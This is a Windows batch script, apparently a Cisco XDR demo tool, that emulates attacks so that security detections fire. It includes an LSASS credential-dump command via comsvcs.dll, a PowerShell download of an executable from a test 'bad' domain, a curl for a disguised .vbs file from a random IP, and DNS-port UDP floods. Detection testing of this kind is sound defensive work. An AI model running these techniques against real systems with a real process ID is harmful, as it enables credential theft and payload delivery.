@echo off
:menu
cls
echo.
echo     / \__       XX    XX DDDDDD   RRRRRR
echo    (    @\___	 XX  XX  DD   DD  RR   RR
echo    /         O	  XXXX   DD    DD RR   RR
echo   /   (_____/	  XXXX   DD    DD RRRRRR
echo   /_____/   U	 XX  XX  DD   DD  RR  RR
echo    		XX    XX DDDDDD   RR   RR
echo.
echo For details or assistance with this script, contact Darryl Hicks (darhicks@cisco.com)
echo.
echo.
echo.
echo. This file will now trigger native XDR telemetry sources for detections.
echo.
echo.
echo EDR: This will trigger an "LSASS Memory Dump via comsvcs" and "W32.ComsvcsDumpedMemory.ioc" EDR alert by attempting to dump Lsass memory into a file called lsass.dmp, however the Lsass PID is not included so the attempt will fail.
echo.
echo.
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full
echo.
echo Completed Successfully
echo.
echo This triggers "Environment Variables for Payload Execution" and "Content Download Using Powershell" NVM Alerts by using powershell to download a picture from Cisco.com into temp using a variable, and then removing the file.
echo.
echo.
powershell -command "Invoke-WebRequest -Uri 'https://www.cisco.com/content/dam/cisco-cdc/site/images/heroes/homepage/2026/cisco-live-ciscolive-2026-900x506.jpg' -OutFile \"$env:TEMP\Wallpaper.jpg\""
echo.
echo Completed Successfully
echo.
echo.
echo.
echo This command will Trigger DNS security by attempting a wget to a malicous looking (benign) site internetbadguys.com. 
echo It is expected this attempt will fail. Please wait.
echo.
echo.
echo This 146.112.61.107 address is an Umbrella test IP referenced here
echo https://support.umbrella.com/hc/en-us/articles/115001357688-What-are-the-Cisco-Umbrella-Block-Page-IP-Addresses
echo.
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://internetbadguys.com/wget.exe','C:\temp\wget.exe')"
echo.
echo The Errors Are Expected. The Umbrella Trigger Completed Successfully!
echo.
echo This triggers a firewall "Potentially Hidden File Extension" Alert by attempting a CURL for vbs script from never before seen IP address.
echo. 
echo It is expected this attempt will fail. Please wait.
echo.
echo.
set /a x1=(%RANDOM% %% 255)
set /a x2=(%RANDOM% %% 255)
set /a x3=(%RANDOM% %% 255)
set /a x4=(%RANDOM% %% 255)
set "url=http://%x1%.%x2%.%x3%.%x4%/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.pdf.vbs"
@echo on
curl "%url%"
@echo off
echo.
echo.
echo The trigger Completed Successfully!
echo.
echo.
echo To trigger network detection, this DNS Abuse emulation performs 1200 byte, slow, UDP Ping to IP 64.102.6.247, 10,000 times.
echo This is followed by the same technique to 64.102.6.247.
echo.
echo This will take some time.......
echo.
echo Starting Task 1: Pinging 203.0.113.53 (TEST-NET) UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 203.0.113.53' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('203.0.113.53', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
timeout /t 30
echo.
echo Starting Task 2: Pinging 64.102.6.247 (Cisco) UDP port 53...
powershell -Command "1..9999 | ForEach-Object { Write-Progress -Activity 'Pinging 64.102.6.247' -PercentComplete ($_/100); $udpClient = New-Object System.Net.Sockets.UdpClient('64.102.6.247', 53); $data = [System.Text.Encoding]::ASCII.GetBytes('A' * 1200); $udpClient.Send($data, $data.Length) | Out-Null; Start-Sleep -Milliseconds 25 }"
echo.
echo Tasks completed.
echo Ending Script in 15 seconds
timeout /t 20
exit